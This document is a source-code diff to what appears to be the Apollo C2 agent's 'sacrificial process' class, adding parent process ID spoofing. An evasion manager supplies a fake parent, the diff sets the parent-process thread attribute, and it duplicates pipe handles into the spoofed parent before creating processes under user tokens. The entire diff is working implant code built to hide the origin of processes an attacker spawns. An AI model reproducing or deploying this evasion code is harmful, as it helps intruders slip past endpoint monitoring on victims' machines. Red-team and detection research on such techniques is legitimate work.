@@ -53,6 +53,7 @@ namespace Apollo.SacrificialProcesses
         internal string command { get; private set; }
         private ProcessInformation processInfo = new ProcessInformation();
         private StartupInfo startupInfo = new StartupInfo();
+        private StartupInfoEx startupInfoEx = new StartupInfoEx();
         private CreateProcessFlags processFlags = CreateProcessFlags.CREATE_UNICODE_ENVIRONMENT;
         private SecurityAttributes securityAttributes = new SecurityAttributes();
         private readonly ManualResetEvent exited = new ManualResetEvent(false);
@@ -77,14 +78,18 @@ namespace Apollo.SacrificialProcesses
 
         private bool suspend;
 
-        private SafeFileHandle hReadOut, hWriteOut, hReadErr, hWriteErr, hReadIn, hWriteIn;
+        private SafeFileHandle hReadOut, hWriteOut, hReadErr, hWriteErr, hReadIn, hWriteIn, hDupWriteOut = new SafeFileHandle(IntPtr.Zero, true), hDupWriteErr = new SafeFileHandle(IntPtr.Zero, true);
         private IntPtr unmanagedEnv;
 
         private bool Initialize(IntPtr hToken)
         {
             bool bRet = false;
             securityAttributes.bInheritHandle = true;
-
+            //bRet = InitializeSecurityDescriptor(out SECURITY_DESCRIPTOR sd, 1);
+            //bRet = SetSecurityDescriptorDacl(ref sd, true, IntPtr.Zero, false);
+            //IntPtr pSd = Marshal.AllocHGlobal(Marshal.SizeOf(sd));
+            //Marshal.StructureToPtr(sd, pSd, false);
+            //securityAttributes.lpSecurityDescriptor = pSd;
             bRet = CreatePipe(out hReadOut, out hWriteOut, securityAttributes, 0);
             if (!bRet)
                 throw new Win32Exception(Marshal.GetLastWin32Error());
@@ -101,6 +106,7 @@ namespace Apollo.SacrificialProcesses
             if (!bRet)
                 throw new Win32Exception(Marshal.GetLastWin32Error());
 
+            IntPtr hDupStdOutWrite;
 
             if (!CreateEnvironmentBlock(out unmanagedEnv, hToken, false))
             {
@@ -117,9 +123,62 @@ namespace Apollo.SacrificialProcesses
             startupInfo.dwFlags = STARTF.STARTF_USESTDHANDLES | STARTF.STARTF_USESHOWWINDOW;
             // Wonder if this interferes with stdout?
             startupInfo.wShowWindow = 0;
-            startupInfo.hStdOutput = hWriteOut;
-            startupInfo.hStdError = hWriteErr;
-            startupInfo.hStdInput = hReadIn;
+            
+
+            var evasionArgs = Evasion.EvasionManager.GetSacrificialProcessStartupInformation();
+
+            
+            IntPtr hParentProc = OpenProcess(ProcessAccessFlags.MAXIMUM_ALLOWED, false, evasionArgs.ParentProcessId);
+            IntPtr lpVal = Marshal.AllocHGlobal(IntPtr.Size);
+            IntPtr lpSize = IntPtr.Zero;
+
+            Marshal.WriteIntPtr(lpVal, hParentProc);
+
+            var result1 = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
+            startupInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
+            if (InitializeProcThreadAttributeList(startupInfoEx.lpAttributeList, 1, 0, ref lpSize))
+            { 
+                if (UpdateProcThreadAttribute(
+                startupInfoEx.lpAttributeList,
+                0,
+                (IntPtr)0x00020000,
+                lpVal,
+                (IntPtr)IntPtr.Size,
+                IntPtr.Zero,
+                IntPtr.Zero))
+                {
+                    processFlags |= CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT;
+                    DuplicateHandle(System.Diagnostics.Process.GetCurrentProcess().Handle,
+                        hWriteOut,
+                        hParentProc,
+                        ref hDupWriteOut,
+                        0,
+                        true,
+                        DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
+                    DuplicateHandle(System.Diagnostics.Process.GetCurrentProcess().Handle,
+                        hWriteErr,
+                        hParentProc,
+                        ref hDupWriteErr,
+                        0,
+                        true,
+                        DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
+                    startupInfo.hStdOutput = hDupWriteOut;
+                    startupInfo.hStdError = hDupWriteErr;
+                    startupInfo.hStdInput = hReadIn;
+                    startupInfoEx.StartupInfo = startupInfo;
+                } else
+                {
+                    bRet = false;
+                }
+            } else
+            {
+                bRet = false;
+            }
+
+            if (!bRet)
+            {
+                Marshal.FreeHGlobal(lpVal);
+            }
             return bRet;
         }
 
@@ -198,7 +257,7 @@ namespace Apollo.SacrificialProcesses
                         processFlags,
                         unmanagedEnv,
                         null,
-                        ref startupInfo,
+                        ref startupInfoEx,
                         out processInfo);
                     if (!bRet)
                         throw new Win32Exception(Marshal.GetLastWin32Error());
@@ -210,14 +269,12 @@ namespace Apollo.SacrificialProcesses
 
                 Handle = processInfo.hProcess;
                 PID = (uint)processInfo.dwProcessId;
-                startupInfo.hStdOutput.Close();
-                startupInfo.hStdError.Close();
-                startupInfo.hStdInput.Close();
                 StandardOutput = new StreamReader(new FileStream(hReadOut, FileAccess.Read), Console.OutputEncoding);
                 StandardError = new StreamReader(new FileStream(hReadErr, FileAccess.Read), Console.OutputEncoding);
                 StandardInput = new StreamWriter(new FileStream(hWriteIn, FileAccess.Write), Console.InputEncoding);
 
-                WaitForExitAsync();
+                if (PID != 0)
+                    WaitForExitAsync();
 
                 return bRet;
             }
@@ -285,6 +342,7 @@ namespace Apollo.SacrificialProcesses
             //success = ImpersonateLoggedOnUser(hToken.DangerousGetHandle());
             //if (!success)
             //    return success;
+            
             success = CreateProcessAsUser(
                 hToken,
                 null,
@@ -295,12 +353,13 @@ namespace Apollo.SacrificialProcesses
                 processFlags,
                 unmanagedEnv,
                 null,
-                ref startupInfo,
+                ref startupInfoEx,
                 out processInfo
             );
             dwError = Marshal.GetLastWin32Error();
             if (!success && dwError == Win32Error.ERROR_PRIVILEGE_NOT_HELD)
             {
+                
                 success = CreateProcessWithTokenW(
                     hToken.DangerousGetHandle(),
                     LogonFlags.LOGON_NETCREDENTIALS_ONLY,
@@ -309,8 +368,9 @@ namespace Apollo.SacrificialProcesses
                     processFlags,
                     unmanagedEnv,
                     null,
-                    ref startupInfo,
+                    ref startupInfoEx,
                     out processInfo);
+
                 dwError = Marshal.GetLastWin32Error();
 
                 if (!success && dwError == Win32Error.ERROR_PRIVILEGE_NOT_HELD)
@@ -327,7 +387,7 @@ namespace Apollo.SacrificialProcesses
                             processFlags,
                             unmanagedEnv,
                             null,
-                            ref startupInfo,
+                            ref startupInfoEx,
                             out processInfo);
                         dwError = Marshal.GetLastWin32Error();
                     }
@@ -339,14 +399,11 @@ namespace Apollo.SacrificialProcesses
 
             Handle = processInfo.hProcess;
             PID = (uint)processInfo.dwProcessId;
-            startupInfo.hStdOutput.Close();
-            startupInfo.hStdError.Close();
-            startupInfo.hStdInput.Close();
             StandardOutput = new StreamReader(new FileStream(hReadOut, FileAccess.Read), Console.OutputEncoding);
             StandardError = new StreamReader(new FileStream(hReadErr, FileAccess.Read), Console.OutputEncoding);
             StandardInput = new StreamWriter(new FileStream(hWriteIn, FileAccess.Write), Console.InputEncoding);
-
-            WaitForExitAsync();
+            if (PID != 0)
+                WaitForExitAsync();
 
             return success;
         }
@@ -387,7 +444,7 @@ namespace Apollo.SacrificialProcesses
                         catch { }
                     }
                 }
-                System.Threading.Thread.Sleep(1000);
+                //System.Threading.Thread.Sleep(1000);
             }
             output = "";
             try
@@ -482,6 +539,9 @@ namespace Apollo.SacrificialProcesses
                     ExitCode = dwExit;
                 else
                     ExitCode = Marshal.GetLastWin32Error();
+                startupInfo.hStdOutput.Close();
+                startupInfo.hStdError.Close();
+                startupInfo.hStdInput.Close();
             });
             thr.Start();
         }
